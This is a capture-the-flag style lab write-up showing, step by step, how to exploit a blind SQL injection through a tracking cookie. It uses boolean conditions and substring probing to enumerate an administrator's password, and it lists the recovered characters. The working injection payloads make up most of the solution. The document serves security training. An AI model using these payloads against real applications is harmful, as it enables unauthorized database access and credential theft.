# Lab-11 SQL Injection

## Blind SQL injection with conditional responses

### Problem

- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

- The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

- The database contains a different table called `users`, with columns called `username and password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.To solve the lab, log in as the `administrator` user.

### Solution

- Intercept with burpsuite.After that in webpage just goto any category you see a welcome message.

- In burp goto=> http history and send the request to repeter.
```SQL Query
-- you see there is a tracing cookie something like this:Cookie: TrackingId=4MtYcZEIGGYpleCY; session=skAxJJuZeumumOOOGMnuv76WbF2KftcN
-- First verify using single Quote ('):Cookie: TrackingId=4MtYcZEIGGYpleCY'--; session=skAxJJuZeumumOOOGMnuv76WbF2KftcN
-- And you see the welcome back messege is disappear.Now we use AND operator and try to solve the lab
Cookie: TrackingId=4MtYcZEIGGYpleCY' AND 1=1--
-- Welcome Back appear
Cookie: TrackingId=4MtYcZEIGGYpleCY' AND 1=2-- 
-- Welcome back disappear
-- Now we can figuring that there is a Users table is there
Cookie: TrackingId=4MtYcZEIGGYpleCY' AND (select 'a' from users limit 1)='a'--
-- After that try to figuring administrator user is there
Cookie: TrackingId=4MtYcZEIGGYpleCY' and (select 'a' from users where username='administrator' limit 1)='a'--
-- Tru to to figure out length of password
Cookie: TrackingId=4MtYcZEIGGYpleCY' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
Cookie: TrackingId=4MtYcZEIGGYpleCY' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>50)='a'--
-- we see that password length is lessthan 50 so we send the request to 'Intruder' and try to find the lenth
Cookie: TrackingId=4MtYcZEIGGYpleCY' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
-- and we can figure out that password length is 20 . And now we can figure the password using 'substring' and agai send the request to intruder for further
'AND (SELECT substring(password,$1$,1) FROM users WHERE username='administrator')='$a$'--
-- Now we can gather all welcome back responce and enumurate the administrator password
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 
y 2 z z 9 w e n f p  z  3  5  4  n  1  3  5  8  3 
```
- Lab Solved!!!
